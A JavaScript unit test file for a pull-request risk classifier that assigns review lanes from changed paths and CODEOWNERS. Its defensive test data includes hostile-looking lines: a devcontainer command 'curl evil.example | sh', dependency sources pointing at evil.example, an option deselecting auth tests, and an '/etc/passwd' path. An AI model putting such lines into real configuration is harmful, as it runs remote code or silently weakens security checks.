#!/usr/bin/env node
// Unit tests for scripts/risk-tier.mjs.
//
// WHY THIS EXISTS. This decides which review lane a change gets, and both ways of
// being wrong are silent: a false "auto" lets a change to auth, CI or a
// migration through on a docs label; a false "owner" teaches everyone to ignore
// the label. It is a pure function over (changed files, CODEOWNERS), so every
// branch is a case here — including the ones an adversary would pick (a rename
// out of an owned directory, a `..` path, a diff cut off at 3000 files).
//
// The last group runs the LIVE .github/CODEOWNERS through the classifier, so an
// edit that un-owns a protected path fails here and not in a review.
//
// Run: node scripts/risk-tier.test.mjs

import { readFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import {
  FILE_LIMIT, SMALL_CHANGE_LINES, authorType, classify, onlyDependencyPins, ownedBy, parseCodeowners, versionBumpsWithinMajor,
} from "./risk-tier.mjs";

const here = dirname(fileURLToPath(import.meta.url));
let pass = 0;
let fail = 0;
const ok = (name, cond, detail = "") => {
  if (cond) pass++;
  else {
    fail++;
    console.log(`  FAIL  ${name}${detail ? `\n        ${detail}` : ""}`);
  }
};
const group = (name) => console.log(`\n${name}`);

const OWNERS = `
# comment
/backend/app/api/session.py @brokdar
/backend/app/persistence/alembic/ @brokdar
/caddy/ @brokdar
/.github/ @brokdar
/.claude/ @brokdar
/scripts/ @brokdar
/justfile @brokdar
`;
const f = (path, over = {}) => ({ path, additions: 10, deletions: 0, status: "modified", ...over });
const tier = (pr, owners = OWNERS) => classify({ author: "brokdar-agent[bot]", branch: "feat/x", title: "feat: x", ...pr }, owners);

group("owner: an owned path, whoever wrote it");
{
  for (const p of [
    "backend/app/api/session.py",
    "backend/app/persistence/alembic/versions/0042_x.py",
    "caddy/Caddyfile",
    ".github/workflows/ci.yml",
    ".claude/settings.json",
    ".claude/hooks/require_agent_identity.py",
    "scripts/risk-tier.mjs",
  ]) {
    const v = tier({ files: [f("docs/a.md"), f(p)] });
    ok(`${p} makes the whole PR owner`, v.tier === "owner", JSON.stringify(v));
  }
  for (const author of ["brokdar", "brokdar-agent[bot]", "app/dependabot"]) {
    ok(`…whether the author is ${author}`, classify({ author, files: [f("justfile")] }, OWNERS).tier === "owner");
  }
  const v = tier({ files: [f("justfile")] });
  ok("the reason names the path and the rule", /justfile is under \/justfile/.test(v.reasons[0]), JSON.stringify(v));
  ok("a directory entry does not own a file that shares its prefix", ownedBy("caddy-local.txt", parseCodeowners(OWNERS).entries) === null);
  ok("…nor a longer sibling name", ownedBy("scripts-extra/x.sh", parseCodeowners(OWNERS).entries) === null);
}

group("owner: a rename counts at both ends");
{
  const out = tier({ files: [f("backend/app/x.py", { previous: "backend/app/api/session.py", status: "renamed" })] });
  ok("moving an owned file OUT of its path is owner", out.tier === "owner", JSON.stringify(out));
  const into = tier({ files: [f("scripts/new.sh", { previous: "backend/app/x.py", status: "renamed" })] });
  ok("moving a file INTO an owned directory is owner", into.tier === "owner", JSON.stringify(into));
}

group("owner: anything unclassifiable fails safe");
{
  ok("no files at all", tier({ files: [] }).tier === "owner");
  ok("files missing", tier({}).tier === "owner");
  ok("a path that climbs with ..", tier({ files: [f("docs/../scripts/x.sh")] }).tier === "owner");
  ok("an absolute path", tier({ files: [f("/etc/passwd")] }).tier === "owner");
  ok("a path with a newline", tier({ files: [f("docs/a\n.md")] }).tier === "owner");
  ok("an empty path", tier({ files: [f("")] }).tier === "owner");
  ok("a bad PREVIOUS path", tier({ files: [f("docs/a.md", { previous: "../x" })] }).tier === "owner");
  const many = Array.from({ length: FILE_LIMIT }, (_, i) => f(`docs/d${i}.md`, { additions: 0 }));
  ok(`a diff GitHub truncates (${FILE_LIMIT} files)`, tier({ files: many }).tier === "owner");
  ok("just under the limit is classified normally", tier({ files: many.slice(0, 5) }).tier === "auto");
  ok("CODEOWNERS unreadable", tier({ files: [f("docs/a.md")] }, null).tier === "owner");
  ok("CODEOWNERS empty", tier({ files: [f("docs/a.md")] }, "# nothing\n").tier === "owner");
  ok("CODEOWNERS with a glob", tier({ files: [f("docs/a.md")] }, "/docs/** @brokdar\n").tier === "owner");
  ok("CODEOWNERS with an unanchored entry", tier({ files: [f("docs/a.md")] }, "docs/ @brokdar\n").tier === "owner");
  ok("CODEOWNERS with an ownerless line", tier({ files: [f("docs/a.md")] }, "/docs/\n").tier === "owner");
}

group("auto: prose and brand-new tests, nothing that can change behaviour");
{
  ok("a docs edit", tier({ files: [f("docs/review/notes.md")] }).tier === "auto");
  ok("a README edit", tier({ files: [f("README.md")] }).tier === "auto");
  ok("a brand-new backend test", tier({ files: [f("backend/tests/unit/test_x.py", { status: "added" })] }).tier === "auto");
  ok("a brand-new frontend test", tier({ files: [f("frontend/tests/new.test.ts", { status: "added" })] }).tier === "auto");
  ok("docs and a new test together", tier({ files: [f("docs/a.md"), f("frontend/tests/x.test.ts", { status: "added" })] }).tier === "auto");
  const edge = tier({ files: [f("docs/a.md", { additions: SMALL_CHANGE_LINES, deletions: 0 })] });
  ok(`exactly ${SMALL_CHANGE_LINES} lines is still auto`, edge.tier === "auto", JSON.stringify(edge));
  const over = tier({ files: [f("docs/a.md", { additions: SMALL_CHANGE_LINES, deletions: 1 })] });
  ok(`${SMALL_CHANGE_LINES + 1} lines is agent`, over.tier === "agent", JSON.stringify(over));
  ok("additions and deletions both count", tier({ files: [f("docs/a.md", { additions: 120, deletions: 120 })] }).tier === "agent");
  ok("deleting a doc is auto", tier({ files: [f("docs/old.md", { status: "removed", additions: 0, deletions: 40 })] }).tier === "auto");
  ok("docs plus one code file is agent", tier({ files: [f("docs/a.md"), f("backend/app/services/x.py")] }).tier === "agent");
  ok("a test-LOOKING path outside the test trees is code", tier({ files: [f("backend/app/testing_utils.py")] }).tier === "agent");
}

group("not auto: markdown that steers agents or feeds code");
{
  for (const p of ["CLAUDE.md", "frontend/CLAUDE.md", "AGENTS.md", "docs/AGENTS.md", "build-everything-plan.md", "docs/feature-plan.md"]) {
    ok(`${p} is not "just docs"`, tier({ files: [f(p)] }).tier === "agent");
  }
  ok("a non-Markdown file under docs/ is not prose", tier({ files: [f("docs/x.py")] }).tier === "agent");
  ok("…nor a script there", tier({ files: [f("docs/run.sh")] }).tier === "agent");
  ok(".agents/ holds the text of the symlinked skills: not docs", tier({ files: [f(".agents/skills/alembic/SKILL.md")] }).tier === "agent");
}

group("not auto: a test that already exists, or code the gate runs");
{
  const agent = (name, files) => ok(name, tier({ files }).tier === "agent", JSON.stringify(tier({ files })));
  agent("editing an existing test in place", [f("backend/tests/unit/test_x.py", { status: "modified" })]);
  agent("gutting an existing test (0 added, 190 deleted)", [f("backend/tests/unit/test_auth.py", { additions: 0, deletions: 190 })]);
  agent("deleting a test file", [f("backend/tests/unit/test_auth.py", { status: "removed", additions: 0, deletions: 40 })]);
  agent("a modified conftest", [f("backend/tests/conftest.py", { additions: 3 })]);
  agent("even a brand-new conftest (collection hooks)", [f("backend/tests/unit/conftest.py", { status: "added" })]);
  agent("a mocks/ fixture", [f("frontend/tests/mocks/handlers.ts", { additions: 50, deletions: 50 })]);
  agent("a new mocks/ file", [f("frontend/tests/mocks/new.ts", { status: "added" })]);
  agent("golden data (binary: GitHub reports 0 lines)", [f("backend/tests/data/golden/outdoor_ride.fit", { additions: 0, deletions: 0 })]);
  agent("the e2e login setup", [f("frontend/e2e/auth.setup.ts", { status: "added" })]);
  agent("a new test that arrives WITH a modified one", [f("backend/tests/unit/test_new.py", { status: "added" }), f("backend/tests/unit/test_old.py")]);
}

group("not auto: a rename is judged at BOTH ends");
{
  const agent = (name, files) => ok(name, tier({ files }).tier === "agent", JSON.stringify(tier({ files })));
  agent("production code renamed INTO docs", [f("docs/athlete.md", { previous: "backend/app/services/athlete.py", status: "renamed", additions: 0, deletions: 0 })]);
  agent("a test renamed to .txt (drops out of collection)", [f("backend/tests/unit/disabled_auth.txt", { previous: "backend/tests/unit/test_auth.py", status: "renamed", additions: 0, deletions: 0 })]);
  agent("a test renamed into docs", [f("docs/test_auth.md", { previous: "backend/tests/unit/test_auth.py", status: "renamed", additions: 0, deletions: 0 })]);
  agent("a test renamed to another test (still not new)", [f("backend/tests/unit/test_b.py", { previous: "backend/tests/unit/test_a.py", status: "renamed", additions: 0, deletions: 0 })]);
  ok("a doc renamed to a doc is fine", tier({ files: [f("docs/b.md", { previous: "docs/a.md", status: "renamed", additions: 0, deletions: 0 })] }).tier === "auto");
}

group("owner: a change that cannot be measured");
{
  ok("a file with no line counts", tier({ files: [{ path: "docs/a.md", status: "modified" }] }).tier === "owner");
  ok("a NaN count", tier({ files: [f("docs/a.md", { additions: NaN })] }).tier === "owner");
}

group("dependabot");
{
  const BOT = ["dependabot[bot]"];
  const pins = "@@ -10,3 +10,3 @@\n-    \"fastapi>=0.115.0\",\n+    \"fastapi>=0.116.0\",\n-    \"sqlalchemy[asyncio]==2.0.30\",\n+    \"sqlalchemy[asyncio]==2.0.31\",";
  const dep = (branch, title, files, commitAuthors = BOT) => classify({ author: "app/dependabot", branch, title, files, commitAuthors }, OWNERS);
  const uvFiles = (patch = pins) => [f("backend/pyproject.toml", { patch }), f("backend/uv.lock")];
  const uv = dep("dependabot/uv/backend/backend-deps-abc", "chore(deps): bump the backend-deps group with 11 updates", uvFiles());
  ok("a uv bump whose changed pyproject lines are dependency pins, with the lock, is auto", uv.tier === "auto", JSON.stringify(uv));
  ok("…and says why", /dependency pin/.test(uv.reasons[0]));
  ok("a uv bump touching only the lock is auto", dep("dependabot/uv/backend/x", "t", [f("backend/uv.lock")]).tier === "auto");
  ok("a uv bump that also edits code is agent", dep("dependabot/uv/backend/x", "t", [...uvFiles(), f("backend/app/main.py")]).tier === "agent");
  ok("a uv bump WITHOUT the lock is agent", dep("dependabot/uv/backend/x", "t", [f("backend/pyproject.toml", { patch: pins })]).tier === "agent");
  for (const [name, line] of [
    ["an import-linter contract", '+forbidden_modules = ["httpx"]'],
    ["a pytest option", '+addopts = "--deselect tests/unit/test_auth.py"'],
    ["requires-python", '+requires-python = ">=3.12"'],
    ["a package index", '+url = "https://evil.example/simple"'],
    ["a uv source", '+fastapi = { git = "https://evil.example/fastapi" }'],
    ["a script entry point", '+arc = "app.evil:main"'],
  ]) {
    const v = dep("dependabot/uv/backend/x", "t", uvFiles(`@@ -1 +1 @@\n${line}`));
    ok(`a uv "bump" that rewrites ${name} is agent`, v.tier === "agent", JSON.stringify(v));
  }
  ok("a uv bump with no patch to read is agent", dep("dependabot/uv/backend/x", "t", [f("backend/pyproject.toml"), f("backend/uv.lock")]).tier === "agent");

  // Anyone with write access can push to a dependabot/* branch; the PR still says
  // dependabot opened it. The commits are the evidence.
  ok("a commit by someone else on the branch is agent", dep("dependabot/uv/backend/x", "t", uvFiles(), ["dependabot[bot]", "brokdar"]).tier === "agent");
  ok("the agent's own commit on the branch is agent", dep("dependabot/uv/backend/x", "t", uvFiles(), ["dependabot[bot]", "brokdar-agent[bot]"]).tier === "agent");
  ok("an unattributed commit is agent", dep("dependabot/uv/backend/x", "t", uvFiles(), ["dependabot[bot]", "unattributed"]).tier === "agent");
  ok("no commit authors given is agent", dep("dependabot/uv/backend/x", "t", uvFiles(), []).tier === "agent");

  const dcPatch = (a, b) => `@@ -3 +3 @@\n-    "ghcr.io/devcontainers/features/github-cli:${a}": {},\n+    "ghcr.io/devcontainers/features/github-cli:${b}": {},`;
  const dc = (title, patch, path = ".devcontainer/devcontainer.json") => dep("dependabot/devcontainers/x", title, [f(path, { patch })]);
  ok("a devcontainer bump within a major is auto", dc("t", dcPatch("1.1.0", "1.2.0")).tier === "auto");
  ok("…whatever the title says (a grouped title does not matter)", dc("chore(deps): bump the devcontainers group with 3 updates", dcPatch("1.1.0", "1.1.1")).tier === "auto");
  ok("…and a title claiming a patch cannot hide a MAJOR in the diff", dc("chore(deps): bump x from 1.0.0 to 1.0.1", dcPatch("1.9.0", "2.0.0")).tier === "agent");
  ok("a 0.x minor bump counts as a major", dc("t", dcPatch("0.4.1", "0.5.0")).tier === "agent");
  ok("a 0.x patch bump is within it", dc("t", dcPatch("0.4.1", "0.4.2")).tier === "auto");
  ok("a devcontainer change that is not only versions is agent", dc("t", '@@ -3 +3 @@\n-  "postCreateCommand": "bun install"\n+  "postCreateCommand": "curl evil.example | sh"').tier === "agent");
  ok("startup.sh is not a version bump", dc("t", dcPatch("1.1.0", "1.1.1"), ".devcontainer/startup.sh").tier === "agent");

  const actions = dep("dependabot/github_actions/x", "chore(deps): bump the github-actions group with 4 updates", [f(".github/workflows/ci.yml")]);
  ok("a GitHub Actions bump edits CI, which is owned, so it is owner", actions.tier === "owner", JSON.stringify(actions));
  ok("a frontend bump gets a reviewer", dep("dependabot/bun/frontend/x", "t", [f("frontend/package.json"), f("frontend/bun.lock")]).tier === "agent");
  ok("a tools bump gets a reviewer", dep("dependabot/pip/tools/x", "t", [f("tools/requirements.txt")]).tier === "agent");
  ok("a branch that only LOOKS like dependabot's, from a human, is not auto", classify({ author: "someone", branch: "dependabot/uv/backend/x", files: uvFiles(), commitAuthors: BOT }, OWNERS).tier === "agent");
  ok("an owned path still wins on a dependabot PR", dep("dependabot/uv/backend/x", "t", [...uvFiles(), f("justfile")]).tier === "owner");
}

group("the diff-reading helpers");
{
  ok("pins: a version change", onlyDependencyPins('@@ -1 +1 @@\n-    "a>=1.0",\n+    "a>=1.1",'));
  ok("pins: an extras pin", onlyDependencyPins('+    "a[x,y]==2.0.0",\n-    "a[x,y]==1.0.0",'));
  ok("pins: a new dependency counts too", onlyDependencyPins('+    "newdep>=1",'));
  ok("pins: an empty patch is not proof", !onlyDependencyPins(""));
  ok("pins: undefined is not proof", !onlyDependencyPins(undefined));
  ok("pins: a config line fails the whole patch", !onlyDependencyPins('+    "a>=1",\n+addopts = "-x"'));
  ok("versions: patch bump", versionBumpsWithinMajor("-x:1.0.0\n+x:1.0.1"));
  ok("versions: major bump", !versionBumpsWithinMajor("-x:1.9.0\n+x:2.0.0"));
  ok("versions: unequal line counts", !versionBumpsWithinMajor("-x:1.0.0\n+x:1.0.1\n+y:1.0.0"));
  ok("versions: a changed word besides the version", !versionBumpsWithinMajor("-x:1.0.0\n+y:1.0.1"));
  ok("versions: empty", !versionBumpsWithinMajor(""));
}

group("agent: everything else");
{
  ok("an ordinary service change", tier({ files: [f("backend/app/services/athlete.py"), f("backend/tests/unit/test_athlete.py")] }).tier === "agent");
  ok("a frontend component", tier({ files: [f("frontend/components/x.tsx")] }).tier === "agent");
  ok("the generated API client (never hand-edited, but not owned)", tier({ files: [f("frontend/generated/api/schema.d.ts")] }).tier === "agent");
}

group("author type is reported, and never changes the tier");
{
  ok("app/dependabot", authorType("app/dependabot") === "dependabot");
  ok("dependabot[bot]", authorType("dependabot[bot]") === "dependabot");
  ok("brokdar-agent[bot]", authorType("brokdar-agent[bot]") === "agent");
  ok("app/brokdar-agent", authorType("app/brokdar-agent") === "agent");
  ok("a person", authorType("brokdar") === "human");
  ok("nothing", authorType(undefined) === "human");
  for (const a of ["brokdar", "brokdar-agent[bot]", "somebody"]) {
    ok(`the same diff is the same tier for ${a}`, classify({ author: a, files: [f("backend/app/services/x.py")] }, OWNERS).tier === "agent");
  }
}

group("the live .github/CODEOWNERS, through the classifier");
{
  const live = readFileSync(resolve(here, "../.github/CODEOWNERS"), "utf8");
  const { entries, problems } = parseCodeowners(live);
  ok("it parses with no problems", problems.length === 0, problems.join("; "));
  ok("every entry classifies a PR touching it as owner", entries.every(({ pattern }) => {
    const path = pattern.endsWith("/") ? `${pattern.slice(1)}some/file.txt` : pattern.slice(1);
    return tier({ files: [f("docs/a.md"), f(path)] }, live).tier === "owner";
  }));
  // The paths this whole lane exists for. If an edit to CODEOWNERS un-owns one,
  // this is where it is caught, instead of in the next incident.
  for (const p of [
    "backend/app/api/session.py",
    "backend/app/api/deps.py",
    "backend/app/main.py",
    "backend/app/mcp/auth.py",
    "backend/app/mcp/main.py",
    "caddy/Caddyfile",
    "docker-compose.yml",
    ".github/workflows/zizmor.yml",
    ".github/CODEOWNERS",
    ".claude/settings.json",
    ".claude/hooks/require_agent_identity.py",
    "scripts/as-agent.sh",
    "scripts/risk-tier.mjs",
  ]) {
    ok(`${p} is owned`, ownedBy(p, entries) !== null);
  }
  // Un-owned by the operator on 2026-11-11: the lane is the guards alone.
  for (const p of [
    "backend/schemathesis.toml",
    ".claude/skills/commit/SKILL.md",
    ".claude/rules/clock-monotonicity.md",
    ".claude/agents/arc-reviewer.md",
    ".claude/workflows/implement-plan.js",
    ".claude/statusline.sh",
    "scripts/check-migration-required.sh",
    "scripts/check-api-schema-sync.sh",
    "scripts/ci-status.mjs",
    "scripts/workflow-guards.test.mjs",
  ]) {
    ok(`${p} is not owned`, ownedBy(p, entries) === null);
  }
  for (const p of [".claude/hooks/block_npm.py", "scripts/review-breaker.mjs", "scripts/check-codeowners.sh", "scripts/setup-repo.sh"]) {
    ok(`${p} is owned`, ownedBy(p, entries) !== null);
  }
  for (const p of ["backend/app/services/athlete.py", "backend/app/persistence/alembic/versions/anything.py", "backend/app/api/routers.py", "frontend/components/x.tsx", "docs/a.md", "CLAUDE.md", "backend/tests/unit/test_auth.py", "justfile", ".env.example", ".pre-commit-config.yaml", ".agents/skills/alembic/SKILL.md", "scripts/bootstrap-env.sh"]) {
    ok(`${p} is not owned`, ownedBy(p, entries) === null);
  }
}

console.log(`\n  ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
